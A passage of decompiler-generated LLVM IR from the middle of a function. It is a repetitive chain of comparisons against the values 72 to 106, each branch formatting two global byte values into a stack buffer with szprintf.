  %v3_ba30 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_ba3c = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_ba48 = sext i8 %v3_ba30 to i32
  %v6_ba48 = sext i8 %v3_ba3c to i32
  %v8_ba48 = call i32 @szprintf(i32 %v2_ba24, i32 ptrtoint ([13 x i8]* @global_var_203f0.213 to i32), i32 %v4_ba48, i32 %v6_ba48, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba4c

dec_label_pc_ba4c:                                ; preds = %dec_label_pc_ba18, %dec_label_pc_ba24
  %v7_ba50 = icmp eq i32 %v2_a93c, 72
  br i1 %v7_ba50, label %dec_label_pc_ba58, label %dec_label_pc_ba80

dec_label_pc_ba58:                                ; preds = %dec_label_pc_ba4c
  %v2_ba58 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ba64 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_ba70 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_ba7c = sext i8 %v3_ba64 to i32
  %v6_ba7c = sext i8 %v3_ba70 to i32
  %v8_ba7c = call i32 @szprintf(i32 %v2_ba58, i32 ptrtoint ([13 x i8]* @global_var_20400.215 to i32), i32 %v4_ba7c, i32 %v6_ba7c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba80

dec_label_pc_ba80:                                ; preds = %dec_label_pc_ba4c, %dec_label_pc_ba58
  %v7_ba84 = icmp eq i32 %v2_a93c, 73
  br i1 %v7_ba84, label %dec_label_pc_ba8c, label %dec_label_pc_bab4

dec_label_pc_ba8c:                                ; preds = %dec_label_pc_ba80
  %v2_ba8c = ptrtoint i32* %stack_var_-36 to i32
  %v3_ba98 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_baa4 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_bab0 = sext i8 %v3_ba98 to i32
  %v6_bab0 = sext i8 %v3_baa4 to i32
  %v8_bab0 = call i32 @szprintf(i32 %v2_ba8c, i32 ptrtoint ([13 x i8]* @global_var_20410.217 to i32), i32 %v4_bab0, i32 %v6_bab0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bab4

dec_label_pc_bab4:                                ; preds = %dec_label_pc_ba80, %dec_label_pc_ba8c
  %v7_bab8 = icmp eq i32 %v2_a93c, 74
  br i1 %v7_bab8, label %dec_label_pc_bac0, label %dec_label_pc_bae8

dec_label_pc_bac0:                                ; preds = %dec_label_pc_bab4
  %v2_bac0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bacc = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_bad8 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_bae4 = sext i8 %v3_bacc to i32
  %v6_bae4 = sext i8 %v3_bad8 to i32
  %v8_bae4 = call i32 @szprintf(i32 %v2_bac0, i32 ptrtoint ([13 x i8]* @global_var_20420.219 to i32), i32 %v4_bae4, i32 %v6_bae4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bae8

dec_label_pc_bae8:                                ; preds = %dec_label_pc_bab4, %dec_label_pc_bac0
  %v7_baec = icmp eq i32 %v2_a93c, 75
  br i1 %v7_baec, label %dec_label_pc_baf4, label %dec_label_pc_bb1c

dec_label_pc_baf4:                                ; preds = %dec_label_pc_bae8
  %v2_baf4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bb00 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_bb0c = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_bb18 = sext i8 %v3_bb00 to i32
  %v6_bb18 = sext i8 %v3_bb0c to i32
  %v8_bb18 = call i32 @szprintf(i32 %v2_baf4, i32 ptrtoint ([13 x i8]* @global_var_20430.221 to i32), i32 %v4_bb18, i32 %v6_bb18, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bb1c

dec_label_pc_bb1c:                                ; preds = %dec_label_pc_bae8, %dec_label_pc_baf4
  %v7_bb20 = icmp eq i32 %v2_a93c, 76
  br i1 %v7_bb20, label %dec_label_pc_bb28, label %dec_label_pc_bb50

dec_label_pc_bb28:                                ; preds = %dec_label_pc_bb1c
  %v2_bb28 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bb34 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_bb40 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_bb4c = sext i8 %v3_bb34 to i32
  %v6_bb4c = sext i8 %v3_bb40 to i32
  %v8_bb4c = call i32 @szprintf(i32 %v2_bb28, i32 ptrtoint ([13 x i8]* @global_var_20440.223 to i32), i32 %v4_bb4c, i32 %v6_bb4c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bb50

dec_label_pc_bb50:                                ; preds = %dec_label_pc_bb1c, %dec_label_pc_bb28
  %v7_bb54 = icmp eq i32 %v2_a93c, 77
  br i1 %v7_bb54, label %dec_label_pc_bb5c, label %dec_label_pc_bb84

dec_label_pc_bb5c:                                ; preds = %dec_label_pc_bb50
  %v2_bb5c = ptrtoint i32* %stack_var_-36 to i32
  %v3_bb68 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_bb74 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_bb80 = sext i8 %v3_bb68 to i32
  %v6_bb80 = sext i8 %v3_bb74 to i32
  %v8_bb80 = call i32 @szprintf(i32 %v2_bb5c, i32 ptrtoint ([13 x i8]* @global_var_20450.225 to i32), i32 %v4_bb80, i32 %v6_bb80, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bb84

dec_label_pc_bb84:                                ; preds = %dec_label_pc_bb50, %dec_label_pc_bb5c
  %v7_bb88 = icmp eq i32 %v2_a93c, 78
  br i1 %v7_bb88, label %dec_label_pc_bb90, label %dec_label_pc_bbb8

dec_label_pc_bb90:                                ; preds = %dec_label_pc_bb84
  %v2_bb90 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bb9c = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_bba8 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_bbb4 = sext i8 %v3_bb9c to i32
  %v6_bbb4 = sext i8 %v3_bba8 to i32
  %v8_bbb4 = call i32 @szprintf(i32 %v2_bb90, i32 ptrtoint ([13 x i8]* @global_var_20460.227 to i32), i32 %v4_bbb4, i32 %v6_bbb4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bbb8

dec_label_pc_bbb8:                                ; preds = %dec_label_pc_bb84, %dec_label_pc_bb90
  %v7_bbbc = icmp eq i32 %v2_a93c, 79
  br i1 %v7_bbbc, label %dec_label_pc_bbc4, label %dec_label_pc_bbec

dec_label_pc_bbc4:                                ; preds = %dec_label_pc_bbb8
  %v2_bbc4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bbd0 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_bbdc = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_bbe8 = sext i8 %v3_bbd0 to i32
  %v6_bbe8 = sext i8 %v3_bbdc to i32
  %v8_bbe8 = call i32 @szprintf(i32 %v2_bbc4, i32 ptrtoint ([13 x i8]* @global_var_20470.229 to i32), i32 %v4_bbe8, i32 %v6_bbe8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bbec

dec_label_pc_bbec:                                ; preds = %dec_label_pc_bbb8, %dec_label_pc_bbc4
  %v7_bbf0 = icmp eq i32 %v2_a93c, 80
  br i1 %v7_bbf0, label %dec_label_pc_bbf8, label %dec_label_pc_bc20

dec_label_pc_bbf8:                                ; preds = %dec_label_pc_bbec
  %v2_bbf8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bc04 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_bc10 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_bc1c = sext i8 %v3_bc04 to i32
  %v6_bc1c = sext i8 %v3_bc10 to i32
  %v8_bc1c = call i32 @szprintf(i32 %v2_bbf8, i32 ptrtoint ([13 x i8]* @global_var_20480.231 to i32), i32 %v4_bc1c, i32 %v6_bc1c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bc20

dec_label_pc_bc20:                                ; preds = %dec_label_pc_bbec, %dec_label_pc_bbf8
  %v7_bc24 = icmp eq i32 %v2_a93c, 81
  br i1 %v7_bc24, label %dec_label_pc_bc2c, label %dec_label_pc_bc54

dec_label_pc_bc2c:                                ; preds = %dec_label_pc_bc20
  %v2_bc2c = ptrtoint i32* %stack_var_-36 to i32
  %v3_bc38 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_bc44 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_bc50 = sext i8 %v3_bc38 to i32
  %v6_bc50 = sext i8 %v3_bc44 to i32
  %v8_bc50 = call i32 @szprintf(i32 %v2_bc2c, i32 ptrtoint ([13 x i8]* @global_var_20490.233 to i32), i32 %v4_bc50, i32 %v6_bc50, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bc54

dec_label_pc_bc54:                                ; preds = %dec_label_pc_bc20, %dec_label_pc_bc2c
  %v7_bc58 = icmp eq i32 %v2_a93c, 82
  br i1 %v7_bc58, label %dec_label_pc_bc60, label %dec_label_pc_bc88

dec_label_pc_bc60:                                ; preds = %dec_label_pc_bc54
  %v2_bc60 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bc6c = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_bc78 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_bc84 = sext i8 %v3_bc6c to i32
  %v6_bc84 = sext i8 %v3_bc78 to i32
  %v8_bc84 = call i32 @szprintf(i32 %v2_bc60, i32 ptrtoint ([13 x i8]* @global_var_204a0.235 to i32), i32 %v4_bc84, i32 %v6_bc84, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bc88

dec_label_pc_bc88:                                ; preds = %dec_label_pc_bc54, %dec_label_pc_bc60
  %v7_bc8c = icmp eq i32 %v2_a93c, 83
  br i1 %v7_bc8c, label %dec_label_pc_bc94, label %dec_label_pc_bcbc

dec_label_pc_bc94:                                ; preds = %dec_label_pc_bc88
  %v2_bc94 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bca0 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_bcac = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_bcb8 = sext i8 %v3_bca0 to i32
  %v6_bcb8 = sext i8 %v3_bcac to i32
  %v8_bcb8 = call i32 @szprintf(i32 %v2_bc94, i32 ptrtoint ([13 x i8]* @global_var_204b0.237 to i32), i32 %v4_bcb8, i32 %v6_bcb8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bcbc

dec_label_pc_bcbc:                                ; preds = %dec_label_pc_bc88, %dec_label_pc_bc94
  %v7_bcc0 = icmp eq i32 %v2_a93c, 84
  br i1 %v7_bcc0, label %dec_label_pc_bcc8, label %dec_label_pc_bcf0

dec_label_pc_bcc8:                                ; preds = %dec_label_pc_bcbc
  %v2_bcc8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bcd4 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_bce0 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_bcec = sext i8 %v3_bcd4 to i32
  %v6_bcec = sext i8 %v3_bce0 to i32
  %v8_bcec = call i32 @szprintf(i32 %v2_bcc8, i32 ptrtoint ([13 x i8]* @global_var_204c0.239 to i32), i32 %v4_bcec, i32 %v6_bcec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bcf0

dec_label_pc_bcf0:                                ; preds = %dec_label_pc_bcbc, %dec_label_pc_bcc8
  %v7_bcf4 = icmp eq i32 %v2_a93c, 85
  br i1 %v7_bcf4, label %dec_label_pc_bcfc, label %dec_label_pc_bd24

dec_label_pc_bcfc:                                ; preds = %dec_label_pc_bcf0
  %v2_bcfc = ptrtoint i32* %stack_var_-36 to i32
  %v3_bd08 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_bd14 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_bd20 = sext i8 %v3_bd08 to i32
  %v6_bd20 = sext i8 %v3_bd14 to i32
  %v8_bd20 = call i32 @szprintf(i32 %v2_bcfc, i32 ptrtoint ([13 x i8]* @global_var_204d0.241 to i32), i32 %v4_bd20, i32 %v6_bd20, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bd24

dec_label_pc_bd24:                                ; preds = %dec_label_pc_bcf0, %dec_label_pc_bcfc
  %v7_bd28 = icmp eq i32 %v2_a93c, 86
  br i1 %v7_bd28, label %dec_label_pc_bd30, label %dec_label_pc_bd58

dec_label_pc_bd30:                                ; preds = %dec_label_pc_bd24
  %v2_bd30 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bd3c = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_bd48 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_bd54 = sext i8 %v3_bd3c to i32
  %v6_bd54 = sext i8 %v3_bd48 to i32
  %v8_bd54 = call i32 @szprintf(i32 %v2_bd30, i32 ptrtoint ([13 x i8]* @global_var_204e0.243 to i32), i32 %v4_bd54, i32 %v6_bd54, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bd58

dec_label_pc_bd58:                                ; preds = %dec_label_pc_bd24, %dec_label_pc_bd30
  %v7_bd5c = icmp eq i32 %v2_a93c, 87
  br i1 %v7_bd5c, label %dec_label_pc_bd64, label %dec_label_pc_bd8c

dec_label_pc_bd64:                                ; preds = %dec_label_pc_bd58
  %v2_bd64 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bd70 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_bd7c = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_bd88 = sext i8 %v3_bd70 to i32
  %v6_bd88 = sext i8 %v3_bd7c to i32
  %v8_bd88 = call i32 @szprintf(i32 %v2_bd64, i32 ptrtoint ([13 x i8]* @global_var_204f0.245 to i32), i32 %v4_bd88, i32 %v6_bd88, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bd8c

dec_label_pc_bd8c:                                ; preds = %dec_label_pc_bd58, %dec_label_pc_bd64
  %v7_bd90 = icmp eq i32 %v2_a93c, 88
  br i1 %v7_bd90, label %dec_label_pc_bd98, label %dec_label_pc_bdc0

dec_label_pc_bd98:                                ; preds = %dec_label_pc_bd8c
  %v2_bd98 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bda4 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_bdb0 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_bdbc = sext i8 %v3_bda4 to i32
  %v6_bdbc = sext i8 %v3_bdb0 to i32
  %v8_bdbc = call i32 @szprintf(i32 %v2_bd98, i32 ptrtoint ([13 x i8]* @global_var_20500.247 to i32), i32 %v4_bdbc, i32 %v6_bdbc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bdc0

dec_label_pc_bdc0:                                ; preds = %dec_label_pc_bd8c, %dec_label_pc_bd98
  %v7_bdc4 = icmp eq i32 %v2_a93c, 89
  br i1 %v7_bdc4, label %dec_label_pc_bdcc, label %dec_label_pc_bdf4

dec_label_pc_bdcc:                                ; preds = %dec_label_pc_bdc0
  %v2_bdcc = ptrtoint i32* %stack_var_-36 to i32
  %v3_bdd8 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_bde4 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_bdf0 = sext i8 %v3_bdd8 to i32
  %v6_bdf0 = sext i8 %v3_bde4 to i32
  %v8_bdf0 = call i32 @szprintf(i32 %v2_bdcc, i32 ptrtoint ([13 x i8]* @global_var_20510.249 to i32), i32 %v4_bdf0, i32 %v6_bdf0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bdf4

dec_label_pc_bdf4:                                ; preds = %dec_label_pc_bdc0, %dec_label_pc_bdcc
  %v7_bdf8 = icmp eq i32 %v2_a93c, 90
  br i1 %v7_bdf8, label %dec_label_pc_be00, label %dec_label_pc_be28

dec_label_pc_be00:                                ; preds = %dec_label_pc_bdf4
  %v2_be00 = ptrtoint i32* %stack_var_-36 to i32
  %v3_be0c = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_be18 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_be24 = sext i8 %v3_be0c to i32
  %v6_be24 = sext i8 %v3_be18 to i32
  %v8_be24 = call i32 @szprintf(i32 %v2_be00, i32 ptrtoint ([13 x i8]* @global_var_20520.251 to i32), i32 %v4_be24, i32 %v6_be24, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_be28

dec_label_pc_be28:                                ; preds = %dec_label_pc_bdf4, %dec_label_pc_be00
  %v7_be2c = icmp eq i32 %v2_a93c, 91
  br i1 %v7_be2c, label %dec_label_pc_be34, label %dec_label_pc_be5c

dec_label_pc_be34:                                ; preds = %dec_label_pc_be28
  %v2_be34 = ptrtoint i32* %stack_var_-36 to i32
  %v3_be40 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_be4c = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_be58 = sext i8 %v3_be40 to i32
  %v6_be58 = sext i8 %v3_be4c to i32
  %v8_be58 = call i32 @szprintf(i32 %v2_be34, i32 ptrtoint ([13 x i8]* @global_var_20530.253 to i32), i32 %v4_be58, i32 %v6_be58, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_be5c

dec_label_pc_be5c:                                ; preds = %dec_label_pc_be28, %dec_label_pc_be34
  %v7_be60 = icmp eq i32 %v2_a93c, 92
  br i1 %v7_be60, label %dec_label_pc_be68, label %dec_label_pc_be90

dec_label_pc_be68:                                ; preds = %dec_label_pc_be5c
  %v2_be68 = ptrtoint i32* %stack_var_-36 to i32
  %v3_be74 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_be80 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_be8c = sext i8 %v3_be74 to i32
  %v6_be8c = sext i8 %v3_be80 to i32
  %v8_be8c = call i32 @szprintf(i32 %v2_be68, i32 ptrtoint ([13 x i8]* @global_var_20540.255 to i32), i32 %v4_be8c, i32 %v6_be8c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_be90

dec_label_pc_be90:                                ; preds = %dec_label_pc_be5c, %dec_label_pc_be68
  %v7_be94 = icmp eq i32 %v2_a93c, 93
  br i1 %v7_be94, label %dec_label_pc_be9c, label %dec_label_pc_bec4

dec_label_pc_be9c:                                ; preds = %dec_label_pc_be90
  %v2_be9c = ptrtoint i32* %stack_var_-36 to i32
  %v3_bea8 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_beb4 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_bec0 = sext i8 %v3_bea8 to i32
  %v6_bec0 = sext i8 %v3_beb4 to i32
  %v8_bec0 = call i32 @szprintf(i32 %v2_be9c, i32 ptrtoint ([13 x i8]* @global_var_20550.257 to i32), i32 %v4_bec0, i32 %v6_bec0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bec4

dec_label_pc_bec4:                                ; preds = %dec_label_pc_be90, %dec_label_pc_be9c
  %v7_bec8 = icmp eq i32 %v2_a93c, 94
  br i1 %v7_bec8, label %dec_label_pc_bed0, label %dec_label_pc_bef8

dec_label_pc_bed0:                                ; preds = %dec_label_pc_bec4
  %v2_bed0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bedc = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_bee8 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_bef4 = sext i8 %v3_bedc to i32
  %v6_bef4 = sext i8 %v3_bee8 to i32
  %v8_bef4 = call i32 @szprintf(i32 %v2_bed0, i32 ptrtoint ([13 x i8]* @global_var_20230.156 to i32), i32 %v4_bef4, i32 %v6_bef4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bef8

dec_label_pc_bef8:                                ; preds = %dec_label_pc_bec4, %dec_label_pc_bed0
  %v7_befc = icmp eq i32 %v2_a93c, 95
  br i1 %v7_befc, label %dec_label_pc_bf04, label %dec_label_pc_bf2c

dec_label_pc_bf04:                                ; preds = %dec_label_pc_bef8
  %v2_bf04 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bf10 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_bf1c = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_bf28 = sext i8 %v3_bf10 to i32
  %v6_bf28 = sext i8 %v3_bf1c to i32
  %v8_bf28 = call i32 @szprintf(i32 %v2_bf04, i32 ptrtoint ([13 x i8]* @global_var_20560.259 to i32), i32 %v4_bf28, i32 %v6_bf28, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bf2c

dec_label_pc_bf2c:                                ; preds = %dec_label_pc_bef8, %dec_label_pc_bf04
  %v7_bf30 = icmp eq i32 %v2_a93c, 96
  br i1 %v7_bf30, label %dec_label_pc_bf38, label %dec_label_pc_bf60

dec_label_pc_bf38:                                ; preds = %dec_label_pc_bf2c
  %v2_bf38 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bf44 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_bf50 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_bf5c = sext i8 %v3_bf44 to i32
  %v6_bf5c = sext i8 %v3_bf50 to i32
  %v8_bf5c = call i32 @szprintf(i32 %v2_bf38, i32 ptrtoint ([13 x i8]* @global_var_20260.162 to i32), i32 %v4_bf5c, i32 %v6_bf5c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bf60

dec_label_pc_bf60:                                ; preds = %dec_label_pc_bf2c, %dec_label_pc_bf38
  %v7_bf64 = icmp eq i32 %v2_a93c, 97
  br i1 %v7_bf64, label %dec_label_pc_bf6c, label %dec_label_pc_bf94

dec_label_pc_bf6c:                                ; preds = %dec_label_pc_bf60
  %v2_bf6c = ptrtoint i32* %stack_var_-36 to i32
  %v3_bf78 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_bf84 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_bf90 = sext i8 %v3_bf78 to i32
  %v6_bf90 = sext i8 %v3_bf84 to i32
  %v8_bf90 = call i32 @szprintf(i32 %v2_bf6c, i32 ptrtoint ([13 x i8]* @global_var_20570.261 to i32), i32 %v4_bf90, i32 %v6_bf90, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bf94

dec_label_pc_bf94:                                ; preds = %dec_label_pc_bf60, %dec_label_pc_bf6c
  %v7_bf98 = icmp eq i32 %v2_a93c, 98
  br i1 %v7_bf98, label %dec_label_pc_bfa0, label %dec_label_pc_bfc8

dec_label_pc_bfa0:                                ; preds = %dec_label_pc_bf94
  %v2_bfa0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bfac = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_bfb8 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_bfc4 = sext i8 %v3_bfac to i32
  %v6_bfc4 = sext i8 %v3_bfb8 to i32
  %v8_bfc4 = call i32 @szprintf(i32 %v2_bfa0, i32 ptrtoint ([13 x i8]* @global_var_20580.263 to i32), i32 %v4_bfc4, i32 %v6_bfc4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bfc8

dec_label_pc_bfc8:                                ; preds = %dec_label_pc_bf94, %dec_label_pc_bfa0
  %v7_bfcc = icmp eq i32 %v2_a93c, 99
  br i1 %v7_bfcc, label %dec_label_pc_bfd4, label %dec_label_pc_bffc

dec_label_pc_bfd4:                                ; preds = %dec_label_pc_bfc8
  %v2_bfd4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bfe0 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_bfec = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_bff8 = sext i8 %v3_bfe0 to i32
  %v6_bff8 = sext i8 %v3_bfec to i32
  %v8_bff8 = call i32 @szprintf(i32 %v2_bfd4, i32 ptrtoint ([13 x i8]* @global_var_20590.265 to i32), i32 %v4_bff8, i32 %v6_bff8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bffc

dec_label_pc_bffc:                                ; preds = %dec_label_pc_bfc8, %dec_label_pc_bfd4
  %v7_c000 = icmp eq i32 %v2_a93c, 100
  br i1 %v7_c000, label %dec_label_pc_c008, label %dec_label_pc_c030

dec_label_pc_c008:                                ; preds = %dec_label_pc_bffc
  %v2_c008 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c014 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c020 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c02c = sext i8 %v3_c014 to i32
  %v6_c02c = sext i8 %v3_c020 to i32
  %v8_c02c = call i32 @szprintf(i32 %v2_c008, i32 ptrtoint ([13 x i8]* @global_var_205a0.267 to i32), i32 %v4_c02c, i32 %v6_c02c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c030

dec_label_pc_c030:                                ; preds = %dec_label_pc_bffc, %dec_label_pc_c008
  %v7_c034 = icmp eq i32 %v2_a93c, 101
  br i1 %v7_c034, label %dec_label_pc_c03c, label %dec_label_pc_c064

dec_label_pc_c03c:                                ; preds = %dec_label_pc_c030
  %v2_c03c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c048 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c054 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c060 = sext i8 %v3_c048 to i32
  %v6_c060 = sext i8 %v3_c054 to i32
  %v8_c060 = call i32 @szprintf(i32 %v2_c03c, i32 ptrtoint ([13 x i8]* @global_var_205b0.269 to i32), i32 %v4_c060, i32 %v6_c060, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c064

dec_label_pc_c064:                                ; preds = %dec_label_pc_c030, %dec_label_pc_c03c
  %v7_c068 = icmp eq i32 %v2_a93c, 102
  br i1 %v7_c068, label %dec_label_pc_c070, label %dec_label_pc_c098

dec_label_pc_c070:                                ; preds = %dec_label_pc_c064
  %v2_c070 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c07c = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c088 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c094 = sext i8 %v3_c07c to i32
  %v6_c094 = sext i8 %v3_c088 to i32
  %v8_c094 = call i32 @szprintf(i32 %v2_c070, i32 ptrtoint ([12 x i8]* @global_var_205c0.271 to i32), i32 %v4_c094, i32 %v6_c094, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c098

dec_label_pc_c098:                                ; preds = %dec_label_pc_c064, %dec_label_pc_c070
  %v7_c09c = icmp eq i32 %v2_a93c, 103
  br i1 %v7_c09c, label %dec_label_pc_c0a4, label %dec_label_pc_c0cc

dec_label_pc_c0a4:                                ; preds = %dec_label_pc_c098
  %v2_c0a4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c0b0 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c0bc = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c0c8 = sext i8 %v3_c0b0 to i32
  %v6_c0c8 = sext i8 %v3_c0bc to i32
  %v8_c0c8 = call i32 @szprintf(i32 %v2_c0a4, i32 ptrtoint ([13 x i8]* @global_var_205cc.273 to i32), i32 %v4_c0c8, i32 %v6_c0c8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c0cc

dec_label_pc_c0cc:                                ; preds = %dec_label_pc_c098, %dec_label_pc_c0a4
  %v7_c0d0 = icmp eq i32 %v2_a93c, 104
  br i1 %v7_c0d0, label %dec_label_pc_c0d8, label %dec_label_pc_c100

dec_label_pc_c0d8:                                ; preds = %dec_label_pc_c0cc
  %v2_c0d8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c0e4 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c0f0 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c0fc = sext i8 %v3_c0e4 to i32
  %v6_c0fc = sext i8 %v3_c0f0 to i32
  %v8_c0fc = call i32 @szprintf(i32 %v2_c0d8, i32 ptrtoint ([13 x i8]* @global_var_205dc.275 to i32), i32 %v4_c0fc, i32 %v6_c0fc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c100

dec_label_pc_c100:                                ; preds = %dec_label_pc_c0cc, %dec_label_pc_c0d8
  %v7_c104 = icmp eq i32 %v2_a93c, 105
  br i1 %v7_c104, label %dec_label_pc_c10c, label %dec_label_pc_c134

dec_label_pc_c10c:                                ; preds = %dec_label_pc_c100
  %v2_c10c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c118 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c124 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c130 = sext i8 %v3_c118 to i32
  %v6_c130 = sext i8 %v3_c124 to i32
  %v8_c130 = call i32 @szprintf(i32 %v2_c10c, i32 ptrtoint ([13 x i8]* @global_var_205ec.277 to i32), i32 %v4_c130, i32 %v6_c130, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c134

dec_label_pc_c134:                                ; preds = %dec_label_pc_c100, %dec_label_pc_c10c
  %v7_c138 = icmp eq i32 %v2_a93c, 106
  br i1 %v7_c138, label %dec_label_pc_c140, label %dec_label_pc_c168

dec_label_pc_c140:                                ; preds = %dec_label_pc_c134
  %v2_c140 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c14c = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c158 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c164 = sext i8 %v3_c14c to i32
  %v6_c164 = sext i8 %v3_c158 to i32
